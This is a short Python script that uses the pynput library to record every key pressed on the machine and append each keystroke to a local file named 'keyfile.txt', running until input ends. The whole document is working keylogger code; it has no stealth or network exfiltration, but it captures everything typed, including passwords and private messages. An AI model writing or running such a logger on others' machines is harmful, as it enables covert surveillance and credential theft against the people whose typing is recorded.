from pynput import keyboard

# Initialize an empty string to store the key sequence
key_log = ""

def keyPressed(key):
    global key_log
    # Convert key to string and log it
    key_str = str(key)
    
    # Open the file and append the string representation of the key
    with open("keyfile.txt", 'a') as logkey:
        try:
            # Append the string representation of the key to key_log
            key_log += key_str
            logkey.write(key_str)
        except Exception as e:
            print(f"Error logging key: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()  # To keep the program running
